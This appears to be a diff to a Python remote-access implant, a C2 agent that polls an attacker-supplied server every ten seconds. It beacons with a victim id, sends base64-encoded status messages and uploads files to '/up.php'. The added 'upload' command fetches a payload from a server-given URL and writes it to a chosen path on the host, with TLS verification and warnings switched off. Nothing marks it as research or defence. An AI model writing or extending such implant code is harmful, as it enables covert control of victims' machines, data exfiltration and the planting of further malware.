@@ -4,7 +4,10 @@ import sys
 import time
 import subprocess
 import os
+from urllib3.exceptions import InsecureRequestWarning
 
+
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 uid = sys.argv[1]
 url = sys.argv[2]
 
@@ -43,8 +46,23 @@ while True:
 				}
 				tellme = requests.get(url + "/up.php?res=" + base64_messagedl + "&id="+uid, verify=False)
 				gimme = requests.post(url + "/up.php?id="+uid, files=multipart_form_data , verify=False)
+			
+			
+			if act == "upload":
+				s = ":"
+				urldl = s.join({str(lines.split(":",4)[3]).strip(), str(lines.split(":",5)[2]).strip()})
 				
-
+				path =  str(lines.split(":",5)[-1]).strip()
+				print(urldl)
+				print(path)
+				messagedl = "Dowwloading "+ str(urldl) + " to "+ path
+				messagedl_bytes = messagedl.encode('ascii')
+				base64_bytes = base64.b64encode(messagedl_bytes)
+				base64_messagedl = base64_bytes.decode('ascii')
+				tellme = requests.get(url + "/up.php?res=" + base64_messagedl + "&id="+uid, verify=False)
+				takethis = requests.get(urldl, verify=False)
+				with open(path, 'wb') as f:
+    					f.write(takethis.content)
 	
 	
 	time.sleep(10)
